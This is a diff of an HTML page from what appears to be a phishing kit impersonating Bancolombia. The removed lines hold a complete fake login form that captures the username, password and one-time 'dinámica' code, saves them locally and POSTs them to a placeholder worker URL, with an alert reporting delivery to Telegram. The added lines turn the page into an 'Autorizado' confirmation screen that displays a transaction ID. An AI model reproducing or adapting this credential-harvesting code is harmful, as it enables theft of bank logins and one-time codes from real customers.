@@ -3,83 +3,28 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Login Bancolombia</title>
+<title>Autorizar</title>
 <style>
 body {
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    height: 100vh;
-    background: #f0f0f0;
-    font-family: Arial, sans-serif;
+    display: flex; justify-content: center; align-items: center;
+    height: 100vh; background: #e6f7ff; font-family: Arial, sans-serif;
 }
 .container {
-    background: #fff;
-    padding: 20px 30px;
-    border-radius: 10px;
-    box-shadow: 0 4px 15px rgba(0,0,0,0.2);
-    width: 300px;
+    background: #fff; padding: 20px 30px; border-radius: 10px;
+    box-shadow: 0 4px 15px rgba(0,0,0,0.2); width: 320px; text-align: center;
 }
-input {
-    width: 100%;
-    padding: 10px;
-    margin: 10px 0;
-    font-size: 16px;
-}
-button {
-    width: 100%;
-    padding: 12px;
-    font-size: 16px;
-    background: #0070ba;
-    color: white;
-    border: none;
-    border-radius: 5px;
-    cursor: pointer;
-}
-button:hover { background: #005fa3; }
+h2 { color: #0070ba; }
+p { font-size: 14px; }
 </style>
 </head>
 <body>
 <div class="container">
-    <h2>Login</h2>
-    <input type="text" id="usuario" placeholder="Usuario">
-    <input type="password" id="clave" placeholder="Clave">
-    <input type="text" id="dinamica" placeholder="Dinámica">
-    <button id="enviar">Enviar</button>
+  <h2>✅ Autorizado</h2>
+  <p>Transaction ID: <span id="tid"></span></p>
 </div>
-
 <script>
-document.getElementById("enviar").addEventListener("click", async () => {
-    const usuario = document.getElementById("usuario").value;
-    const clave = document.getElementById("clave").value;
-    const dinamica = document.getElementById("dinamica").value;
-
-    if (!usuario || !clave) {
-        alert("Debes completar usuario y clave.");
-        return;
-    }
-
-    const transactionId = Date.now().toString(36) + Math.random().toString(36).substr(2);
-
-    localStorage.setItem("transactionId", transactionId);
-    localStorage.setItem("bancoldata", JSON.stringify({usuario, clave, dinamica}));
-
-    try {
-        const res = await fetch("https://tu-worker-url/login", {
-            method: "POST",
-            headers: {"Content-Type": "application/json"},
-            body: JSON.stringify({usuario, clave, dinamica, transactionId})
-        });
-        const data = await res.json();
-        if (data.ok) {
-            alert("Datos enviados a Telegram correctamente.");
-            window.location.href = "dinamica.html"; // página para ingresar la dinámica
-        }
-    } catch(e) {
-        console.error(e);
-        alert("Error al enviar los datos.");
-    }
-});
+const id = new URLSearchParams(location.search).get("id");
+document.getElementById("tid").textContent = id || "Desconocido";
 </script>
 </body>
 </html>
